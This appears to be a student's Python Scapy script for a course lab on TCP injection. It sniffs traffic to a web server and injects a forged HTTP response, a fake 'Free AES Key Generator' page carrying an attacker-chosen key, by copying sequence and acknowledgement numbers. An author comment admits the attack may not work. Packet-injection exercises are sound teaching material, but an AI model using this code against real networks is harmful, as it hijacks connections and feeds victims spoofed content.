from scapy.all import send, conf, L3RawSocket
from scapy.all import TCP,IP,Ether
from scapy.all import *
import socket

# Use this function to send packets
def inject_pkt(pkt):
    conf.L3socket=L3RawSocket
    send(pkt)

###
# edit this function to do your attack
###
def handle_pkt(pkt):

	aesraw = "HTTP/1.1 200 OK\r\nContent-Length: 335\r\nContent-Type: text/html; charset=UTF-8\r\nServer: Caddy\r\nDate: Fri, 01 Nov 2024 19:25:28 GMT\r\nConnection: close\r\n\r\n<html>\n<head>\n  <title>Free AES Key Generator!</title>\n</head>\n<body>\n<h1 style=\"margin-bottom: 0px\">Free AES Key Generator!</h1>\n<span style=\"font-size: 5%\">Definitely not run by the NSA.</span><br/>\n<br/>\n<br/>\nYour <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b><br/>\n</body>\n</html>"
	#craft malicious packet
	malpkt = IP(src="3.87.34.204", ihl=5, dst="172.27.150.70", flags="DF", len=538)/TCP(sport="http", dport=0, flags="PA", dataofs=8, reserved=0, window=489, options=[('NOP', None), ('NOP', None), ('Timestamp', (30844701, 789165495))])/Raw(load=aesraw)
	malpkt.show()
	
	def manipulatePackets(pkt):
		print('RECORDED PACKET-----------------------')
		pkt.show()
		
		if pkt[IP].dst == "3.87.34.204" and pkt[TCP].seq != 0 and pkt[TCP].ack != 0:
			malpkt[IP].dst = pkt[IP].src
			malpkt[TCP].seq = pkt[TCP].ack
			malpkt[TCP].ack = pkt[TCP].seq + 118
			malpkt[TCP].dport = pkt[TCP].sport
		if pkt[IP].src == "3.87.34.204":
			malpkt[IP].id = pkt[IP].id + 1
			malpkt[IP].ttl = pkt[IP].ttl
		print('MALPKT--------------------------------')
		malpkt.show()
		inject_pkt(malpkt)
		
		# the malpkt and the accepted packet look exactly the same, except for the chksum which has been cleared, as instructed. the seq, ack, and flags fields are identical, and so are the src and destinations. the malicious packet is also sent immediately after the get request is made, so it should arrive first. we have NOT been given sufficient instruction to solve this problem in the given time.
	
	sniff(prn=manipulatePackets, filter="dst host 3.87.34.204 || src host 3.87.34.204")
	
	pass

def main():
	s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
	while True:
		pkt = s.recv(0xffff)
		handle_pkt(pkt)

if __name__=='__main__':
	main()
